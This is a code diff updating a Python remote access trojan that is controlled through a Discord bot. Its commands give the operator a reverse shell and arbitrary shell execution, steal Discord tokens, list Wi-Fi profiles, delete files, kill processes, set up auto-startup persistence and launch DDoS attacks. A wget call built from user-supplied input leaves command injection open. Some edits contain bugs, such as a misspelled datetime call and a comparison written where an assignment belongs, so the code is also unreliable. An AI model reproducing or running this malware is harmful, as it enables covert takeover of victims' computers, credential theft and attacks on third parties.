@@ -1,5 +1,5 @@
 from trojan_functions import cam, rv, token_grabber, screen_shot, encrypt_decrypt, check_requirements
-import os, subprocess, getpass, datetime, platform, shutil, socket, time, random, webbrowser, signal
+import os, subprocess, getpass, datetime, platform, shutil, socket, time, random, webbrowser, signal, sys
 try:
     import requests
     from discord_webhook import DiscordWebhook
@@ -10,7 +10,7 @@ try:
     import pyautogui
 except ModuleNotFoundError:
     check_requirements.check()
-    exit()
+    sys.exit()
 
 #url
 
@@ -27,7 +27,7 @@ client = commands.Bot(command_prefix='?', description="", intents=discord.Intent
 
 @client.event
 async def on_ready():
-    print("il bot è pronto")
+    print("the trojan is ready")
 
 @client.command()
 @commands.has_permissions(administrator=True)
@@ -36,7 +36,7 @@ async def ip(ctx):
 
 @client.command()
 @commands.has_permissions(administrator=True)
-async def username(ctx):
+async def whoami(ctx):
     await ctx.send(getpass.getuser() + " -> " + requests.get(public_ip).text)
 
 @client.command()
@@ -89,17 +89,26 @@ async def write_file(ctx, inp):
 
 @client.command()
 @commands.has_permissions(administrator=True)
-async def current_directory(ctx):
+async def pwd(ctx):
     await ctx.send(os.getcwd())
 
 @client.command()
 @commands.has_permissions(administrator=True)
-async def show_directory(ctx, dirr):
-    await ctx.send(os.listdir(dirr))
+async def ls(ctx, dirr):
+    sdir = os.listdir(dirr)
+    fdir = ""
+    for i in range(len(sdir)):
+        if(os.path.isdir(dirr + "/" + sdir[i]) == True):
+            fdir += "D " + sdir[i]
+            fdir += "\n"
+        else:
+            fdir += "F " + sdir[i]
+            fdir += "\n"
+    await ctx.send(fdir)
 
 @client.command()
 @commands.has_permissions(administrator=True)
-async def delete_file(ctx, filee):
+async def rm(ctx, filee):
     try:
         os.remove(filee)
         await ctx.send(filee + " eliminated")
@@ -114,14 +123,14 @@ async def start_process(ctx, process_name):
             os.system("start " + process_name)
         else:
             os.system(process_name)
-        await ctx.send(datetime.datetime.now)
+        await ctx.send(datetime.datetime.nowi())
         await ctx.send("Process started")
     except:
         await ctx.send("Failed starting process")
 
 @client.command()
 @commands.has_permissions(administrator=True)
-async def kill_process(ctx, process_name):
+async def kill(ctx, process_name):
     if(platform.system() == "Windows"):
         status = os.system("taskkill /IM " + process_name + " /T /F")
         await ctx.send("process killed")
@@ -158,8 +167,19 @@ async def tasklist(ctx):
     os.remove("tasks.txt")
 
 @client.command()
+async def searchTask(ctx, task):
+    try:
+        if os.name == "nt":
+            task = subprocess.check_output(f"tasklist | findstr {task}", shell=True).decode('utf-8')
+        else:
+            task = subprocess.check_output(f"ps aux | grep {task}", shell=True).decode('utf-8')
+        await ctx.send(task)
+    except:
+        await ctx.send("Error")
+
+@client.command()
 @commands.has_permissions(administrator=True)
-async def remove_dir(ctx, dirr):
+async def rmDir(ctx, dirr):
     try:
         os.rmdir(dirr)
         await ctx.send(dirr + " eliminated")
@@ -173,7 +193,7 @@ async def clear(ctx, amount=1000000000):
 
 @client.command()
 @commands.has_permissions(administrator=True)
-async def power_off(ctx):
+async def shutdown(ctx):
     await ctx.send("powering off the pc")
     if(platform.system() == "Windows"):
         os.system("shutdown /s /t 00")
@@ -197,7 +217,11 @@ async def wifi_profiles(ctx):
         else:
             await ctx.send("Error. wifi profile not found")
     else:
-        await ctx.send(os.listdir("/etc/NetworkManager/system-connections/"))
+        files = os.listdir("/etc/NetworkManager/system-connections/")
+        out = ""
+        for i in range(len(files)):
+            out += files[i] + "\n"
+        await ctx.send(out)
 
 @client.command()
 @commands.has_permissions(administrator=True)
@@ -217,12 +241,23 @@ async def wifi_info(ctx, wifi_name):
 @client.command()
 @commands.has_permissions(administrator=True)
 async def system_info(ctx):
-    systemInfo = platform.system()
+    systemInfo = "Platform: " + platform.system()
+    if(os.name == "nt"):
+        pass
+    else:
+        systemInfo += "Kernel name: " + subprocess.check_output("uname -s", shell=True).decode('utf-8')
+        systemInfo += "Node name: " + subprocess.check_output("uname -n", shell=True).decode('utf-8')
+        systemInfo += "Kernel release: " + subprocess.check_output("uname -r", shell=True).decode('utf-8')
+        systemInfo += "kernel version: " + subprocess.check_output("uname -v", shell=True).decode('utf-8')
+        systemInfo += "Machine: " + subprocess.check_output("uname -m", shell=True).decode('utf-8')
+        systemInfo += "Processor: " + subprocess.check_output("uname -p", shell=True).decode('utf-8')
+        systemInfo += "Hardware platform: " + subprocess.check_output("uname -i", shell=True).decode('utf-8')
+        systemInfo += "OS: " + subprocess.check_output("uname -o", shell=True).decode('utf-8')
     await ctx.send(systemInfo)
 
 @client.command()
 @commands.has_permissions(administrator=True)
-async def os_shell(ctx, ip, port):
+async def revshell(ctx, ip, port):
     await ctx.send("sending reverse shell")
     try:
         await ctx.send("reverse shell sent :)")
@@ -256,12 +291,15 @@ async def auto_startup(ctx, filename):
 
 @client.command()
 @commands.has_permissions(administrator=True)
-async def victim_token(ctx):
-    await ctx.send(token_grabber.tok_grab())
+async def token(ctx):
+    try:
+        await ctx.send(token_grabber.tok_grab())
+    except:
+        await ctx.send("Error: can't grab the token")
 
 @client.command()
 @commands.has_permissions(administrator=True)
-async def open_browser(ctx, url):
+async def browser(ctx, url):
     await ctx.send("Opening browser")
     try:
         webbrowser.open(url)
@@ -281,10 +319,17 @@ async def rickroll(ctx):
             yt.streams.get_highest_resolution().download()
             title = yt.title + ".mp4"
             os.rename(title,"video.mp4")
-            os.startfile("video.mp4")
+            if os.name == "nt":
+                os.startfile("video.mp4")
+            else:
+                subprocess.call(["xdg-open", "video.mp4"])
             await ctx.send("Rickrolled ;)")
         except:
-            await ctx.send("Rickrolled failed :(")
+            try:
+                webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+                await ctx.send("Rickrolled ;)")
+            except:
+                await ctx.send("Rickrolled failed :(")
 
 @client.command()
 @commands.has_permissions(administrator=True)
@@ -293,14 +338,32 @@ async def play_video(ctx, link):
         os.remove("video2.mp4")
     except:
         pass
-    yt = pytube.YouTube(link)
-    yt.streams.get_highest_resolution().download()
-    title = yt.title + ".mp4"
-    try:
-        os.rename(title,"video2.mp4")
-        os.startfile("video2.mp4")
-    except:
-        await ctx.send("error...")
+    if "://youtube.com" in link:
+        yt = pytube.YouTube(link)
+        yt.streams.get_highest_resolution().download()
+        title = yt.title + ".mp4"
+        valid = 1
+    elif "://" in link:
+        title = "video2.mp4"
+        os.system("wget " + link + " -O video2.mp4")
+        valid == 1
+    else:                                                                                                                                                                                                       
+        await ctx.send("Error, invalid url")                                                                                                                                                                    
+        valid = 0
+    if valid == 1:
+        try:
+            if title != "video2.mp4":
+                os.rename(title,"video2.mp4")
+            os.startfile("video2.mp4")
+            await ctx.send("Video started")
+        except:
+            try:
+                if(link.startswith("https://www.youtube.com") or link.startswith("https://youtube.com/")):
+                    webbrowser.open(link)
+                else:
+                    await ctx.send("Error, can't open the link")
+            except:
+                await ctx.send("Error...")
 
 @client.command()
 @commands.has_permissions(administrator=True)
@@ -345,9 +408,26 @@ async def ddos(ctx, ip, port, tm, dl):
             break;
 
 @client.command()
-@commands.has_permissions(administrator=True)
+async def shell(ctx, command):
+    cmd = subprocess.check_output(command, shell=True).decode('utf-8')
+    try:
+        await ctx.send(cmd)
+    except:
+        try:
+            file = open("tmp.txt", "w")
+            file.write(cmd)
+            await ctx.send(file=discord.File('tmp.txt'))
+            os.remove("tmp.txt")
+        except:
+            await ctx.send("Error")
+
+@client.command()
 async def commands(ctx):
-    await ctx.send(file=discord.File("commands.txt"))
+    try:
+        await ctx.send(file=discord.File("commands.txt"))
+    except:
+        await ctx.send("Error, commands.txt not found")
+
 
 client.run(discord_bot_token)
 
